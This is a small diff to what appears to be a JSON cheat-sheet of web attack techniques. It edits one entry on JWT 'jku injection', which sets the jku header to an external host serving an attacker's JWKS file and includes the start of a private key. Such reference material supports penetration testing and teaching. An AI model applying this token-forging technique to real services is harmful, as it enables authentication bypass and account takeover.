@@ -274,7 +274,7 @@
     },
     {
         "title": "JWT VULNERABILITY: JKU INJECTION",
-        "subtitle": "add jku parameter and edit k parameter <br> - \"jku\":\"https://recon-theta.vercel.app/jwks.json\" <br> - \"kid\":\"f15e8a3e-a2f2-4270-aaa8-ca359dbe3376\"",
+        "subtitle": "add jku parameter and edit k parameter <br><br> \"jku\":\"https://recon-theta.vercel.app/jwks.json\" , <br>\"kid\":\"f15e8a3e-a2f2-4270-aaa8-ca359dbe3376\"",
         "commands": [
             "{",
             "    \"p\": \"_Om2nMpnqRk3lproGAmiGxHUGjiVxQR7ZzjWs7D7ofASIwrrZeqoCJlTLedI_zo0SNnYPEeTRF6xbhijOtRbtua_9COEluj-ISt9V9rRbQlaatcuuihS3O8Y-DS_e2cDVo4R2_-rHsXEGKoysnyr6LFBDi742LR91ICpG-3WHJM\",",
